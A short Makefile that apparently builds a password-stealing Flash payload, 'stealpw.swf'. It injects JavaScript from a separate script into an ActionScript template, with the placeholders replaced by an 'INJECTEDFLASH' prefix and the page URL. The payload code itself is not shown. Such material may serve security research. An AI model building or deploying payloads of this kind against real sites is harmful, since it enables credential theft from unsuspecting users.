all: SHELL:=/bin/bash 
all:
	jscode=$$(cat ../js/script.js | sed 's|REPLACEMEWITHPREFIX|INJECTEDFLASH|g' | sed 's|REPLACEMEWITHURL|"+_root._url+"|g'); \
		as2code=$$(cat stealpw.sc.tmpl); echo "$${as2code/REPLACEMEWITHCODE/$$jscode}" > stealpw.sc
	swfc -o stealpw.swf stealpw.sc 

clean:
	rm -f *~ stealpw.sc
